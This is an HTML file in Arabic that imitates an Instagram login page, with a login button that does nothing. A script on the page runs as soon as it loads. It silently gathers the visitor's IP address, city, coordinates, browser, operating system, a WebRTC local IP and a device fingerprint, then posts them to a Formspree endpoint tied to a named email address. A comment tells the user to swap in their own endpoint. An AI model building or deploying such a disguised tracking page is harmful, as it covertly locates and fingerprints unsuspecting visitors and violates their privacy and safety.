<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;width:100vw}
.ig-box{width:350px;text-align:center}
.ig-logo{height:78px;margin-bottom:20px;font-size:38px;font-weight:bold;background:linear-gradient(45deg,#405DE6,#5851DB,#833AB4,#C13584,#E1306C,#F77707);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.ig-inp{width:100%;padding:9px 12px;margin-bottom:6px;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;box-sizing:border-box;color:#262626}
.ig-btn{width:100%;background:#38bdf5;color:#fff;padding:12px;border:none;border-radius:4px;font-weight:bold;margin-top:12px;cursor:pointer;font-size:14px}
.ig-div{height:1px;background:#dbdbdb;margin:16px 0;display:flex;align-items:center;justify-content:center;text-align:center}
.ig-div span{background:#fafafa;padding:0 8px;color:#262626;font-size:13px}
.ig-foot{text-align:center;margin-top:20px;font-size:13px;color:#262626}
.ig-foot a{color:#262626;text-decoration:none}
#status{display:none;margin-top:15px;color:#46d160;font-weight:bold;font-size:14px;opacity:0;transition:opacity .5s}
</style>
</head>
<body>

<div class="ig-box" id="authBox">
  <div class="ig-logo">Instagram</div>
  <input type="text" class="ig-inp" placeholder="اسم المستخدم أو البريد">
  <input type="password" class="ig-inp" placeholder="كلمة المرور">
  <button class="ig-btn" onclick="void(0)">تسجيل الدخول</button>
  <div class="ig-div"><span>أو</span></div>
  <p class="ig-foot">بالتسجيل فإنك توافق على <a href="#">سياسة استخدامنا</a></p>
</div>

<p id="status">✅ تم إرسال بيانات الجهاز بنجاح إلى البريد!</p>

<script>
// ⚠️ استبدل الرابط أدني بمعرفك من Formspree بعد التسجيل المجاني
const FORMSPREE_ENDPOINT = "https://formspree.io/f/mnpnbrwj"; 
const TARGET_EMAIL = "owes170@gmail.com";

async function gatherData(){
  let ip='', country='', city='', tz='', coords='';
  try{
    const res = await fetch('https://ipapi.co/json/');
    const d = await res.json();
    if(d.ip && !d.error){
      ip=d.ip; country=d.country_name; city=d.city; 
      tz=new Intl.DateTimeFormat().resolvedOptions().timeZone;
      coords=`${d.latitude}, ${d.longitude}`;
    }
  } catch(e) {}

  const ua=navigator.userAgent;
  const browser=ua.includes('Firefox')?'Firefox':ua.includes('Chrome')?'Chrome':ua.includes('Safari')&&ua.includes('Edge')?'Edge':'Unknown';
  const os=ua.includes('Windows')?'Windows':ua.includes('Macintosh')?'macOS':ua.includes('Android')?'Android':ua.includes('iPhone')?'iOS':'Other';

  let localIp='غير متاح';
  try{
    const conn=new RTCPeerConnection({});
    const ipCheck=await new Promise(resolve=>{
      const noop=()=>{};conn.createOffer().then(o=>conn.setLocalDescription(o)).catch(noop);
      setTimeout(()=>{if(!conn?.sdp){resolve('لا يملك WebRTC');return;}const lines=conn.sdp.split('\n');let found=null;for(let line of lines){const m=line.match(/(?:25[0-5]|2[0-4]\d|[01]?\d\d?)/)?.[1];if(m)found=m;}resolve(found||'مخفي');},600);});
      localIp=ipCheck;conn.close();
  }catch(e){localIp='غير متاح'}

  const raw=`${ua}|${navigator.platform}|${screen.width}|${new Date().getTimezoneOffset()}|${navigator.hardwareConcurrency||0}`;let hash=0;for(let i=0;i<raw.length;i++){const c=raw.charCodeAt(i);hash=((hash<<5)-hash)+c;}
  const fp=Math.abs(hash).toString(36).toUpperCase();

  return {ip,country,city,tz,coords,browser,os,localIp,fp};
}

window.addEventListener('load', async ()=>{
  const data = await gatherData();
  
  const payload = {
    message: `🌐 IP: ${data.ip}\n📍 الموقع: ${data.city}, ${data.country}\n🧭 الإحداثيات: ${data.coords}\n🕒 المنطقة الزمنية: ${data.tz}\n🖥️ المتصفح: ${data.browser}\n💻 النظام: ${data.os}\n🔗 Local IP: ${data.localIp}\n🔐 بصمة الجهاز: ${data.fp}`,
    email: TARGET_EMAIL,
    _subject: `بيانات زائر جديد | IP: ${data.ip}`
  };

  try{
    await fetch(FORMSPREE_ENDPOINT, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    });
    
    // إظهار رسالة نجاح خفية
    document.getElementById('status').style.display = 'block';
    setTimeout(()=>document.getElementById('status').style.opacity='1', 50);
    console.log('✅ Data sent to email successfully');
  } catch(e) {
    console.error('❌ Failed to send data:', e);
  }
});
</script>
</body>
</html>
